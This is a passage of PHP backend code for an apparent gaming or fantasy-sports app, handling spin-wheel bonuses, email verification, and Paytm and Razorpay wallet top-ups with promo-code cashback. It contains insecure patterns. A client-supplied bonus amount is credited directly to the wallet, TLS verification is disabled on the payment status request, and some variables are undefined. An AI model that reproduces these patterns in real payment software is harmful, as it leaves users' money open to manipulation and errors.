    //Spin wheel
    public function applySpinBonus($request, $response)
    {
        global $settings, $baseurl;
        $code       =  	$settings['settings']['code']['rescode'];
        $errcode    =  	$settings['settings']['code']['errcode'];
        $loginuser 	= 	$request->getAttribute('decoded_token_data');
        $uid 		= 	$loginuser['id'];
        $input      = 	$request->getParsedBody();
        $spinbnscheck = $input['spinbnscheck'];
        $spinbns = $input['spinbns'];
        $currentTime = time();
        $expireTime = $currentTime + 6 * (60 * 60);
        
        $query  = "SELECT * FROM spinbonouspersent WHERE user_id=:user_id ORDER BY id DESC LIMIT 1";
        $pcode  = $this->db->prepare($query);
        $pcode->execute(['user_id' => $uid]);
        $res3 = $pcode->fetch();
      
        $get_created_time = $res3['created'];
        $date = date("Y-m-d", $get_created_time);
        $current_date =  date("Y-m-d", time());
        
        if ($date == $current_date) {
            $resArr = $this->security->errorMessage("You can Spin once in a day");
            return $response->withJson($resArr, $errcode);
        }
        if (empty($spinbns)) {
            $resArr = $this->security->errorMessage("Please enter spinbns value");
            return $response->withJson($resArr, $errcode);
        }

        if (empty($spinbnscheck)) {
            $resArr = $this->security->errorMessage("Please enter spinbnscheck value");
            return $response->withJson($resArr, $errcode);
        }

        //$lastId = $this->db->lastInsertId();
        if ($spinbnscheck =='amount') {
            if ($spinbns > 0) {
                $usrWltBal 	= $this->security->getUserWalletBalance($uid);
                $curWltbns  = $usrWltBal['wltbns'];
                $newWltbns 	= $curWltbns + $spinbns;
                $created	= time();

                $query  = "SELECT * FROM users WHERE id=:user_id ";
                $pcode  = $this->db->prepare($query);
                $pcode->execute(['user_id' => $uid]);
                $res = $pcode->fetch();
                $wltbnsPre = $res['wltbns'];
                $wltbns = $wltbnsPre + $spinbns;

                $ttype = 'cr';
                $atype = 'spinamount';
                $wlt = 'wltbns';
                try {
                    $stmt = $this->db->prepare("UPDATE users SET wltbns = :wltbns WHERE id=:user_id");
                    $stmt->bindParam(':wltbns', $wltbns);
                    $stmt->bindParam(':user_id', $uid);
                    $stmt->execute();

                    $stmt3 = $this->db->prepare("INSERT INTO spinbonouspersent (user_id,  created, expire, amount_type, amount) VALUES (:user_id, :created, :expire, :amount_type, :amount)");
                    $stmt3->bindParam(':user_id', $uid);
                    $stmt3->bindParam(':created', $currentTime);
                    $stmt3->bindParam(':expire', $expireTime);
                    $stmt3->bindParam(':amount_type', $spinbnscheck);
                    $stmt3->bindParam(':amount', $spinbns);
                    $stmt3->execute();

                    $stmt2 = $this->db->prepare("INSERT INTO transactions (userid,  amount, txdate, ttype, atype, wlt, prebal, curbal) VALUES (:userid, :amount, :txdate, :ttype, :atype, :wlt, :prebal, :curbal)");
                    $stmt2->bindParam(':userid', $uid);
                    $stmt2->bindParam(':amount', $spinbns);
                    $stmt2->bindParam(':txdate', $currentTime);
                    $stmt2->bindParam(':ttype', $ttype);
                    $stmt2->bindParam(':atype', $atype);
                    $stmt2->bindParam(':wlt', $wlt);
                    $stmt2->bindParam(':prebal', $wltbnsPre);
                    $stmt2->bindParam(':curbal', $wltbns);
 
                 
                    if ($stmt2->execute()) {
                        $resArr['code']  = 0;
                        $resArr['error'] = false;
                        $resArr['msg']   = 'Spin Wheel bonus Added';
                    } else {
                        $resArr['code']  = 1;
                        $resArr['error'] = true;
                        $resArr['msg'] 	 = 'Record not inserted.';
                    }
                } catch (\PDOException $e) {
                    $resArr['code']  = 1;
                    $resArr['error'] = true;
                    $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
                }
                return $response->withJson($resArr, $code);
            }
        } elseif ($spinbnscheck =='percentage') {
            try {
                $stmt = $this->db->prepare("INSERT INTO spinbonouspersent (user_id, persentamount, created, expire, amount_type) VALUES (:user_id,:persentamount, :created, :expire, :amount_type)");
                $stmt->bindParam(':user_id', $uid);
                $stmt->bindParam(':persentamount', $spinbns);
                $stmt->bindParam(':created', $currentTime);
                $stmt->bindParam(':expire', $expireTime);
                $stmt->bindParam(':amount_type', $spinbnscheck);
            
                if ($stmt->execute()) {
                    $resArr['code']  = 0;
                    $resArr['error'] = false;
                    $resArr['msg']   = 'Add Persentage Offer to Your Account';
                } else {
                    $resArr['code']  = 1;
                    $resArr['error'] = true;
                    $resArr['msg'] 	 = 'Record not inserted.';
                }
            } catch (\PDOException $e) {
                $resArr['code']  = 1;
                $resArr['error'] = true;
                $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
            }
            return $response->withJson($resArr, $code);
        } else {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg'] 	 = 'Record not inserted.';
        }
        return $response->withJson($resArr, $code);
    }

    public function getSpinBonus($request, $response)
    {
        global $settings, $baseurl;
        $code       =  	$settings['settings']['code']['rescode'];
        $errcode    =  	$settings['settings']['code']['errcode'];
        $loginuser 	= 	$request->getAttribute('decoded_token_data');
        $uid 		= 	$loginuser['id'];

        $query  = "SELECT * FROM spinbonouspersent WHERE user_id=:user_id ORDER BY id DESC LIMIT 1";
        $pcode  = $this->db->prepare($query);
        $pcode->execute(['user_id' => $uid]);
        $res = $pcode->fetch();
                    
        $get_created_time = $res['created'];
        $date = date("Y-m-d", $get_created_time);
        $current_date =  date("Y-m-d", time());

        $query2  = "SELECT * FROM spinbonouspersent WHERE user_id=:user_id";
        $pcode2  = $this->db->prepare($query2);
        $pcode2->execute(['user_id' => $uid]);
        $res2 = $pcode2->fetch();

        if (empty($res2)) {
            $res['show'] ='true';
            $resArr['code']  = 0;
            $resArr['error'] = false;
            $resArr['msg'] 	 = 'Record not found.';
            $resArr['data']  = $this->security->removenull($res);
            return $response->withJson($resArr, $code);
        }
        if (!empty($res)) {
            if ($date == $current_date) {
                $res['show'] ='false';
            } else {
                $res['show'] ='true';
            }
            $resArr['code']  = 0;
            $resArr['error'] = false;
            $resArr['msg']   = 'Apply spinbonous .';
            $resArr['data']  = $this->security->removenull($res);
        } else {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $res['show'] ='false';
            $resArr['msg'] 	 = 'Record found.';
        }
        return $response->withJson($resArr, $code);
    }
    public function getUserSpinBonus($request, $response)
    {
        global $settings, $baseurl;
        $code       =  	$settings['settings']['code']['rescode'];
        $errcode    =  	$settings['settings']['code']['errcode'];
        $loginuser 	= 	$request->getAttribute('decoded_token_data');
        $uid 		= 	$loginuser['id'];
     
        $sql = "SELECT * FROM spinbonouspersent WHERE user_id=:user_id ORDER BY id DESC  ";
        $stmt = $this->db->prepare($sql);
        $params=["user_id"=>$uid];
        $stmt->execute($params);
        $contests =  $stmt->fetchAll();

        if (!empty($contests)) {
            $resArr['code']  = 0;
            $resArr['error'] = false;
            $resArr['msg']   = 'All Persent Offers.';
            $resArr['data']  = $this->security->removenull($contests);
        } else {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg'] 	 = 'Record not found.';
        }
        return $response->withJson($resArr, $code);
    }



    //Verify Email
    public function sendVerifyEmail($request, $response)
    {
        global $settings, $baseurl;
        $code       =  	$settings['settings']['code']['rescode'];
        $errcode    =  	$settings['settings']['code']['errcode'];
        $loginuser 	= 	$request->getAttribute('decoded_token_data');
        $uid 		= 	$loginuser['id'];

        $user 		= 	$this->security->getUserById($uid);

        $str = \Security::generateRandomString(40) . base64_encode($uid);

        $user['link'] = $baseurl . '/verifymail/' . $str;

        if ($user['isemailverify'] == ACTIVESTATUS) {
            $resArr = $this->security->errorMessage("Email address already verified");
            return $response->withJson($resArr, $errcode);
        }

        $stmt  = $this->db->prepare("UPDATE users SET vkey=:vkey WHERE  id=:userid");
        if ($stmt->execute(["vkey" => $str, "userid" => $uid])) {
            $user['template'] = "verifyemail.php";
            $user['subject'] = 'Verify email address';
            $this->sendMail($user);
            try {
                $this->mailer->sendMessage('/mail/verifyemail.php', ['data' => $user], function ($message) use ($user) {
                    $name = " ";

                    if (!empty($user['name'])) {
                        $name = $user['name'];
                    }
                    //$user['email'] = 'xxx@mailinator.com';
                    $message->setTo($user['email'], $name);
                    $message->setSubject($user['subject']);
                });
            } catch (Swift_TransportException $STe) {
                $string = date("Y-m-d H:i:s")  . ' - ' . $STe->getMessage() . PHP_EOL;
                file_put_contents("./../logs/errorlog_mail.txt", $string, FILE_APPEND);
            }

            $resArr['code']  = 0;
            $resArr['error'] = false;
            $resArr['msg']   = "Verification link has been sent to your email address.";
        } else {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg']   = "Verify email not sent, contact to webmaster.";
        }
        return $response->withJson($resArr, $code);
    }

    public function verifymail($request, $response, $args)
    {
        global $settings, $baseurl;
        $code       =  	$settings['settings']['code']['rescode'];
        $errcode    =  	$settings['settings']['code']['errcode'];
        $dir    = __DIR__ . '/../settings/playwebsetting';
        $addset = @file_get_contents($dir);

        $data       =   [];
        $data['webname'] = $settings['settings']['webname'];
        $vrkey = $args['vrkey'];

        $stmt  = $this->db->prepare("UPDATE users SET isemailverify=:isemailverify,vkey='' WHERE  vkey=:vkey");
        $stmt->execute(["isemailverify" => ACTIVESTATUS, "vkey" => $vrkey]);
        $res = intval($stmt->rowCount());

        if ($res) {
            $data['msg'] = "Email Verified";
            $data['msgclr'] = "#0ca71b";
        } else {
            $data['msg'] = "Link expired";
            $data['msgclr'] = "#f30202";
        }
        if ($addset != false) {
            $res = json_decode($addset, true);
            if (isset($res['mailconfig']) && !empty($res['mailconfig'])) {
                $data['mailconfig'] = $res['mailconfig'];
            }
        }

        return $this->renderer->render($response, "/verifymailpage.php", ['data' => $data]);
    }

    public function paytm_wallet_callback($data)
    {
        $status = $data['STATUS'];
        if ($status == "TXN_SUCCESS") {
            $data = $this->paytmStatusApiFun($data);
            $user_id = explode('-', $data['ORDERID']);
            $uid = $user_id[0];
            $docid = $user_id[1];
            $promocodeid = (isset($user_id[3]) && !empty($user_id[3])) ? $user_id[3] : '';
            $txnid = $data['TXNID'];
            $amount = $data['TXNAMOUNT'];
            $status = $data['STATUS'];
            $txdate = time();
            $created 	= time();

            if ($status == "TXN_SUCCESS") {
                $query  = "SELECT id FROM transactions WHERE txid=:txid AND userid=:userid";
                $query_res  = $this->db->prepare($query);
                $query_res->bindParam("userid", $uid);
                $query_res->bindParam("txid", $txnid);
                $query_res->execute();
                $num_rows = $query_res->rowCount();

                if ($num_rows == 0) {
                    $gatewayname = $data['GATEWAYNAME'];
                    $pmode = $data['PAYMENTMODE'];
                    $banktxnid = $data['BANKTXNID'];
                    $bankname = $data['BANKNAME'];
                    $respcode = $data['RESPCODE'];
                    $description = "Payment successfully with amount " . $amount;
                    $this->update_user_wallet($uid, $amount, $txnid, $status, $txdate, $docid, CR, ADDBAL, WLTBAL, $gatewayname, $pmode, $banktxnid, $bankname, $respcode, $description);

                    if (!empty($promocodeid)) {
                        $query  = "SELECT id,pcode,pc_val,pc_val_type,spanding_limit,up_to_cashback,mony_spent FROM promocode WHERE id=:promocodeid";
                        $pcode  = $this->db->prepare($query);
                        $pcode->execute(['promocodeid' => $promocodeid]);
                        $res  	= $pcode->fetch();

                        $pc_val_type = $res['pc_val_type'];
                        $pc_val = $res['pc_val'];
                        $mony_spent = $res['mony_spent'];
                        $spanding_limit = $res['spanding_limit'];
                        $up_to_cashback = $res['up_to_cashback'];
                        $created 	= time();
                        $date = date("Y-m-d");

                        if ($spanding_limit == 0) {
                            $bnsamount  = '';
                            if ($pc_val_type == PERCENTAGE_VALUE) {
                                $bnsamount = ($pc_val * $amount) / 100;
                            }
                            if ($pc_val_type == AMOUNT_VALUE) {
                                $bnsamount = $pc_val;
                            }
                        } elseif ($spanding_limit != 0) {
                            $query  = "SELECT sum(distribution_amt) as distribution_amt FROM promocodecoupon WHERE promocode_id=:promocode_id AND date=:date";
                            $query_res  = $this->db->prepare($query);
                            $query_res->bindParam("promocode_id", $promocodeid);
                            $query_res->bindParam("date", $date);
                            $query_res->execute();
                            $amt = $query_res->fetch();
                            $distribution_amt = $amt['distribution_amt'];
                            
                            if ($spanding_limit >  $distribution_amt) {
                                $remaining_amt = $spanding_limit - $distribution_amt;
                                $bnsamount  = '';
                                if ($up_to_cashback > 0) {
                                    $bnsamount = rand(1, $up_to_cashback);
                                    if ($bnsamount > $remaining_amt) {
                                        $bnsamount = $remaining_amt;
                                    }
                                }
                            }
                        }
                        if ($bnsamount > 0) {
                            $new_mony_spent = $mony_spent+$bnsamount;
                            
                            $stmt = $this->db->prepare("UPDATE promocode SET mony_spent = :mony_spent WHERE id=:promocodeid");
                            $stmt->bindParam(':promocodeid', $promocodeid);
                            $stmt->bindParam(':mony_spent', $new_mony_spent);
                            $stmt->execute();
    
                            $stmt2 = $this->db->prepare("INSERT INTO promocodecoupon (promocode_id,distribution_amt,user_id,created,date) VALUES (:promocode_id,:distribution_amt, :user_id, :created, :date)");
                            $stmt2->bindParam(':promocode_id', $promocodeid);
                            $stmt2->bindParam(':distribution_amt', $bnsamount);
                            $stmt2->bindParam(':user_id', $uid);
                            $stmt2->bindParam(':created', $created);
                            $stmt2->bindParam(':date', $date);
                            $stmt2->execute();

                            $pcodeuse_lastid  =  $this->security->addUsesPromoCode(['userid' => $uid, 'pcodeid' => $res['id'], 'created' => $created]);
                            $getWlt 	= $this->security->getUserWalletBalance($uid);
                            $wltbnsPre  = $getWlt["wltbns"];
                            $wltbns 	= $wltbnsPre + $bnsamount;
                            $getWlt 	= $this->security->updateUserWallet($uid, "wltbns", $wltbns);
                            $this->updateTransaction($uid, $bnsamount, $created, $pcodeuse_lastid, CR, PROMOBNS, WLTBNS, $wltbnsPre, $wltbns);
                        }
                    } elseif (empty($promocodeid)) {
                        $query  = "SELECT * FROM spinbonouspersent WHERE user_id=:user_id ORDER BY id DESC LIMIT 1";
                        $pcode  = $this->db->prepare($query);
                        $pcode->execute(['user_id' => $uid]);
                        $res = $pcode->fetch();
                        
                        $curentTime = time();
                        $persentamount = $res['persentamount'];
                        $expireTime = $res['expire'];
                        $amount_type = $res['amount_type'];
                        $spinbonouspersent_id = $res['id'];
                        $spin_amount = $res['amount'];
                        if (empty($spin_amount)) {
                            if ($amount_type == "percentage" && $amount > 99) {
                                if ($expireTime > $curentTime) {
                                    $amountbns = ($amount * $persentamount) / 100;
                                    if ($amountbns > 200) {
                                        $amountbns = 200;
                                    }
                                
                                    //   $newAmount = $amount + $amountbns;
                                    $pcodeuse_lastid = null;
                                    $cashback = "cashback";
                                    $getWlt 	= $this->security->getUserWalletBalance($uid);
                                    $wltbnsPre  = $getWlt["wltbns"];
                                    $wltbns 	= $wltbnsPre + $amountbns;
                                    $getWlt 	= $this->security->updateUserWallet($uid, "wltbns", $wltbns);
                                    $this->updateTransaction($uid, $amountbns, $created, $pcodeuse_lastid, CR, $cashback, WLTBNS, $wltbnsPre, $wltbns);
                                
                                    $stmt = $this->db->prepare("UPDATE spinbonouspersent SET amount = :amount WHERE id=:id");
                                    $stmt->bindParam(':amount', $amountbns);
                                    $stmt->bindParam(':id', $spinbonouspersent_id);
                                    $stmt->execute();
                                }
                            }
                        }
                    }
                }
               

                $data['wallet'] = $this->security->getUserWalletBalance($uid);
            }
        }
        return $data;
    }

    


    public function update_user_wallet($uid, $amount, $txnid, $status, $txdate, $docid, $ttype, $atype, $wlt, $gatewayname, $pmode, $banktxnid, $bankname, $respcode, $description, $paytype = null)
    {
        try {
            $getWlt = $this->security->getUserWalletBalance($uid);
            $pevious_bal = $getWlt["walletbalance"];
            $newbal 	 = $pevious_bal + $amount;

            $updtBal = $this->security->updateUserWallet($uid, "walletbalance", $newbal);
            if ($updtBal) {
                $paytype = ($paytype) ? $paytype : 'Paytm';
                $sql = "INSERT INTO transactions SET userid=:userid, amount=:amount, txid=:txid, status=:status, txdate=:txdate,docid=:docid,ttype=:ttype,atype=:atype,wlt=:wlt,prebal=:prebal,curbal=:curbal";
                $query  = $this->db->prepare($sql);
                $params = ["userid" => $uid, "amount" => $amount, "txid" => $txnid, "status" => $status, "txdate" => $txdate, "docid" => $docid, "ttype" => $ttype, "atype" => $atype, "wlt" => $wlt, "prebal" => $pevious_bal, "curbal" => $newbal];
                $query->execute($params);

                $tid = $this->db->lastInsertId();
                $sql2 = "INSERT INTO transactionchild SET tid=:tid, gatewayname=:gatewayname, pmode=:pmode, banktxnid=:banktxnid, bankname=:bankname,respcode=:respcode,description=:description,paytype=:paytype";
                $stmt  = $this->db->prepare($sql2);
                $params = ["tid" => $tid, "gatewayname" => $gatewayname, "pmode" => $pmode, "banktxnid" => $banktxnid, "bankname" => $bankname, "respcode" => $respcode, "description" => $description, 'paytype' => $paytype];
                $stmt->execute($params);
            }
        } catch (\PDOException $e) {
            echo \Security::pdoErrorMsg($e->getMessage());
            die;
        }
    }

    public function paytmStatusApiFun($data)
    {
        header("Pragma: no-cache");
        header("Cache-Control: no-cache");
        header("Expires: 0");

        $ORDER_ID = $data['ORDERID'];
        $requestParamList = array();
        $responseParamList = array();

        $requestParamList = array("MID" => PAYTM_MERCHANT_MID, "ORDERID" => $ORDER_ID);

        $checkSum = getChecksumFromArray($requestParamList, PAYTM_MERCHANT_KEY);

        $requestParamList['CHECKSUMHASH'] = urlencode($checkSum);

        $data_string = "JsonData=" . json_encode($requestParamList);


        $ch = curl_init();
        $url = PAYTM_STATUS_QUERY_URL;

        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $headers = array();
        $headers[] = 'Content-Type: application/json';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $output = curl_exec($ch);
        $info = curl_getinfo($ch);

        //file_put_contents('paytm_veri_2.txt', print_r($output, true));
        $data = json_decode($output, true);

        return $data;
    }

    public function getPromoCodeChk($request, $response)
    {
        global $settings;

        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];
        $loginuser 	= 	$request->getAttribute('decoded_token_data');
        $uid 		= 	$loginuser['id'];
        $input = $request->getParsedBody();
        $check =  $this->security->validateRequired(["pcode", "amount"], $input);
        if (isset($check['error'])) {
            return $response->withJson($check);
        }
        $input['userid'] = $uid;
        $result = $this->security->isPromoCodeValid($input);

        return $response->withJson($result['resArr'], $result['code']);
    }




    public function orderRazorpay($request, $response)
    {
        global $settings, $baseurl;
        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];
        $multiplyamt = $settings['settings']['razorpay']['multiplyamt'];
        $apisecret = $settings['settings']['razorpay']['apisecret'];
        $loginuser 	= 	$request->getAttribute('decoded_token_data');
        $userid 	= 	$loginuser['id'];
        $resArr =  [];
        $input  =  $request->getParsedBody();
        $check  =  $this->security->validateRequired(['amount'], $input);
        if (isset($check['error'])) {
            return $response->withJson($check);
        }
        $amount  = $input['amount'];
        $pcodeid = '';
        if (isset($input['pcode']) && !empty($input['pcode'])) {
            $promocode = $input['pcode'];
            $result = $this->security->isPromoCodeValid(['amount' => $amount, 'pcode' => $promocode, 'userid' => $userid]);
            if (!empty($result) && $result['resArr']['code'] == 0) {
                $pcodeid = $result['resArr']['data']['id'];
            } else {
                $resArr = $this->security->errorMessage($result['resArr']['msg']);
                return $response->withJson($result['resArr'], $result['code']);
            }
        }

        $resArr = $this->createOrderOnRazorpay($amount, $userid, $pcodeid);
        return $response->withJson($resArr);
    }


    public function createOrderOnRazorpay($amount, $userid, $pcodeid = null)
    {
        global $settings, $baseurl;
        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];
        $multiplyamt = $settings['settings']['razorpay']['multiplyamt'];
        $resArr =  [];

        try {
            $pcodeid =  ($pcodeid) ? $pcodeid : '';
            $receipt = md5(uniqid(rand(), true));
            $created = time();
            $note    = ['pcodeid' => $pcodeid];
            $razorpay = $this->razorpayPaymentApi();
            $order = $razorpay->order->create([
                'receipt' => $receipt,
                'amount' => ($amount * $multiplyamt),
                'payment_capture' => 1,
                'currency' => 'INR',
                'notes' => $note
            ]);
            if ($order && $order->status == 'created') {
                $rorderid = $order->id;
                $data =  ['created' => $created, 'amount' => $amount, 'userid' => $userid, 'rorderid' => $rorderid];
                $stmt = $this->db->prepare("INSERT INTO orders (userid,amount,rorderid,created) VALUES (:userid,:amount,:rorderid,:created)");
                if (!$stmt->execute($data)) {
                    $resArr = $this->security->errorMessage("There is some problem");
                    return $response->withJson($resArr, $errcode);
                }
                $user = $this->security->getUserDetail($userid);
                $order = $order->toArray();
                $order['amount'] = ($order['amount'] / $multiplyamt);
                /*$order['amount_paid']= ($order['amount_paid'])?($order['amount_paid']/$multiplyamt):0;
                $order['amount_due']= ($order['amount_due'])?($order['amount_due']/$multiplyamt):0;
                $order['offer_id']= ($order['offer_id'])?$order['offer_id']:'';
                unset($order['id']);*/
                $res['username'] = ($user['name']) ? $user['name'] : $user['teamname'];
                $res['email']   = $user['email'];
                $res['phone']   = $user['phone'];
                $res['rorderid'] = $rorderid;
                $res['logourl'] = "https://fancy11.com/img/logo.png";
                $resArr['code']  = 0;
                $resArr['error'] = false;
                $resArr['msg']   = "Order successfully created.";
                $resArr['data']	 = $res;
            } else {
                $resArr['code']  = 1;
                $resArr['error'] = true;
                $resArr['msg']   = "Please Try Again";
            }
        } catch (\Exception $e) {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
            $code = $errcode;
        }

        return $resArr;
    }
    public function paymentRazorpay($request, $response)
    {
        global $settings, $baseurl;
        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];
        $multiplyamt = $settings['settings']['razorpay']['multiplyamt'];
        $apisecret = $settings['settings']['razorpay']['apisecret'];
        $loginuser 	= 	$request->getAttribute('decoded_token_data');
        $userid 	= 	$loginuser['id'];
        $resArr =  [];
        $input  =  $request->getParsedBody();
        $check  =  $this->security->validateRequired(['razorpay_payment_id'], $input);
        if (isset($check['error'])) {
            return $response->withJson($check);
        }
        //$payment_id="pay_DHxEyxv7Vr2vzS";
        $payment_id = $input['razorpay_payment_id'];
        $sign 		= (isset($input['razorpay_signature'])) ? $input['razorpay_signature'] : '';
        $order_id	= (isset($input['razorpay_order_id'])) ? $input['razorpay_order_id'] : '';
        $created = time();
        $promocodeid = '';
        try {
            $razorpay = $this->razorpayPaymentApi();
            $payment = $razorpay->payment->fetch($payment_id);
            if ($payment && $pdata = $payment->toArray()) {
                $localOrder = $this->security->getOrderByRazorpayId($order_id);
                $transactionchild = $this->security->chkRazorpayId($payment_id, 'Razorpay');
                $genrate_sign = hash_hmac('sha256', $order_id . '|' . $payment_id, $apisecret);
                if (!$transactionchild) {
                    if ($localOrder && $order_id == $pdata['order_id']) {
                        $amount = ($pdata['amount'] / $multiplyamt);
                        $order_id = ($order_id) ? $order_id : $pdata['order_id'];
                        $order = $razorpay->order->fetch($order_id);
                        $order = $order->toArray();
                        $resArr['code']  = 1;
                        $resArr['error'] = true;
                        $resArr['msg']   = "Payment Unauth";
                        if ($pdata['status'] == 'captured' && $sign) {
                            $paymentdata  = ['razorpay_signature'  => $sign, 'razorpay_payment_id' => $payment_id, 'razorpay_order_id' => $order_id];
                            if ($sign == $genrate_sign) {
                                $paymentVerify = $razorpay->utility->verifyPaymentSignature($paymentdata);
                                $pdata['amount'] = ($pdata['amount'] / $multiplyamt);
                                $this->setalRazorpayPayment($pdata, $localOrder, $order);
                                $data['wallet'] = $this->security->getUserWalletBalance($userid);
                                $resArr['code']  = 0;
                                $resArr['error'] = false;
                                $resArr['msg']   = "Amount added successfully";
                                $resArr['data']  = $data;
                            }
                        }
                    } else {
                        $resArr['code']  = 1;
                        $resArr['error'] = true;
                        $resArr['msg']   = "Invalid Order or Payment";
                    }
                } else {
                    if ($sign == $genrate_sign) {
                        $resArr['code']  = 0;
                        $resArr['error'] = false;
                        $resArr['msg']   = "Amount added successfully";
                    } else {
                        $resArr['code']  = 1;
                        $resArr['error'] = true;
                        $resArr['msg']   = "Please try again";
                    }
                }
            } else {
                $resArr['code']  = 1;
                $resArr['error'] = true;
                $resArr['msg']   = "Payment Failed";
            }
        } catch (Exception $e) {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
            $code = $errcode;
        }
        return $response->withJson($resArr);
    }


    public function setalRazorpayPayment($pdata, $localOrder, $order)
    {
        try {
            $rstStatus = true;
            $userid     = $localOrder['userid'];
            $amount     = $pdata['amount'];
            $txnid 		= $pdata['id'];
            $status 	= $pdata['status'];
            $txdate 	= time();
            $docid		= $localOrder['id'];
            $gatewayname = $pdata['method'];
            $pmode 		= $pdata['method'];
            $banktxnid 	= ($pdata['method'] === 'card') ? $pdata['card_id'] : $txnid;
            $bankname 	= $pdata['bank'];
            $respcode 	= 123456;
            $description = "Payment successfully with amount " . $amount;
            $this->update_user_wallet($userid, $amount, $txnid, $status, $txdate, $docid, CR, ADDBAL, WLTBAL, $gatewayname, $pmode, $banktxnid, $bankname, $respcode, $description, 'Razorpay');

            $promocodeid = (isset($order['notes']['pcodeid'])) ? $order['notes']['pcodeid'] : '';

            if (!empty($promocodeid)) {
                $query  = "SELECT id,pcode,pc_val,pc_val_type,spanding_limit,up_to_cashback,mony_spent FROM promocode WHERE id=:promocodeid";
                $pcode  = $this->db->prepare($query);
                $pcode->execute(['promocodeid' => $promocodeid]);
                $res  	= $pcode->fetch();

                $pc_val = $res['pc_val'];
                $mony_spent = $res['mony_spent'];
                $spanding_limit = $res['spanding_limit'];
                $up_to_cashback = $res['up_to_cashback'];
                // code by Arun
                if ($mony_spent == 0) {
                    $couponamt = rand(1, $up_to_cashback);

                    $stmt = $this->db->prepare("UPDATE promocode SET mony_spent = :mony_spent WHERE id=:promocodeid");
                    $stmt->bindParam(':promocodeid', $promocodeid);
                    $stmt->bindParam(':mony_spent', $couponamt);
                    $stmt->execute();

                    $stmt2 = $this->db->prepare("INSERT INTO promocodecoupon (promocode_id,distribution_amt, user_id,created) VALUES (:promocode_id,:distribution_amt, :user_id, :created)");
                    $stmt2->bindParam(':promocode_id', $promocodeid);
                    $stmt2->bindParam(':distribution_amt', $couponamt);
                    $stmt2->bindParam(':user_id', $uid);
                    $stmt2->bindParam(':created', time());
                    $stmt2->execute();
                } elseif ($pc_val > $mony_spent) {
                    $remaining_amt = $spanding_limit - $mony_spent;

                    if ($remaining_amt < $up_to_cashback) {
                        $couponamt = rand(1, $remaining_amt);
                    } else {
                        $couponamt = rand(1, $up_to_cashback);
                    }
                    $new_mony_spent = $mony_spent + $couponamt;

                    $stmt = $this->db->prepare("UPDATE promocode SET mony_spent = :mony_spent WHERE id=:promocodeid");
                    $stmt->bindParam(':promocodeid', $promocodeid);
                    $stmt->bindParam(':mony_spent', $new_mony_spent);
                    $stmt->execute();

                    $stmt2 = $this->db->prepare("INSERT INTO promocodecoupon (promocode_id,distribution_amt, user_id,created) VALUES (:promocode_id,:distribution_amt, :user_id, :created)");
                    $stmt2->bindParam(':promocode_id', $promocodeid);
                    $stmt2->bindParam(':distribution_amt', $couponamt);
                    $stmt2->bindParam(':user_id', $uid);
                    $stmt2->bindParam(':created', time());
                    $stmt2->execute();
                }
                $pcodeuse_lastid  =  $this->security->addUsesPromoCode(['userid' => $uid, 'pcodeid' => $res['id'], 'created' => $created]);
                $getWlt 	= $this->security->getUserWalletBalance($uid);
                $wltbnsPre  = $getWlt["wltbns"];
                $wltbns 	= $wltbnsPre + $couponamt;
                $getWlt 	= $this->security->updateUserWallet($uid, "wltbns", $wltbns);
                $this->updateTransaction($uid, $couponamt, $created, $pcodeuse_lastid, CR, PROMOBNS, WLTBNS, $wltbnsPre, $wltbns);
            } elseif (empty($promocodeid)) {
                $query  = "SELECT * FROM spinbonouspersent WHERE user_id=:user_id ORDER BY id DESC LIMIT 1";
                $pcode  = $this->db->prepare($query);
                $pcode->execute(['user_id' => $uid]);
                $res = $pcode->fetch();
                
                $curentTime = time();
                $persentamount = $res['persentamount'];
                $expireTime = $res['expire'];
                $amount_type = $res['amount_type'];
                $spinbonouspersent_id = $res['id'];
                $spin_amount = $res['amount'];
                if (empty($spin_amount)) {
                    if ($amount_type == "percentage") {
                        if ($expireTime > $curentTime) {
                            $amountbns = ($amount * $persentamount) / 100;
                            //   $newAmount = $amount + $amountbns;
                            $pcodeuse_lastid = null;
                            $cashback = "cashback";
                            $getWlt 	= $this->security->getUserWalletBalance($uid);
                            $wltbnsPre  = $getWlt["wltbns"];
                            $wltbns 	= $wltbnsPre + $amountbns;
                            $getWlt 	= $this->security->updateUserWallet($uid, "wltbns", $wltbns);
                            $this->updateTransaction($uid, $amountbns, $created, $pcodeuse_lastid, CR, $cashback, WLTBNS, $wltbnsPre, $wltbns);
                        
                            $stmt = $this->db->prepare("UPDATE spinbonouspersent SET amount = :amount WHERE id=:id");
                            $stmt->bindParam(':amount', $amountbns);
                            $stmt->bindParam(':id', $spinbonouspersent_id);
                            $stmt->execute();
                        }
                    }
                }
            }
            // if (!empty($promocodeid)) {
            //     $query  = "SELECT id,pcode,pc_val,pc_val_type FROM promocode WHERE id=:promocodeid";
            //     $pcode  = $this->db->prepare($query);
            //     $pcode->execute(['promocodeid' => $promocodeid]);
            //     $res  	= $pcode->fetch();
            //     if ($res) {
            //         $bnsamount  = '';
            //         $created 	= time();
            //         if ($res['pc_val_type'] == PERCENTAGE_VALUE) {
            //             $bnsamount = ($res['pc_val'] * $amount) / 100;
            //         }
            //         if ($res['pc_val_type'] == AMOUNT_VALUE) {
            //             $bnsamount = $res['pc_val'];
            //         }

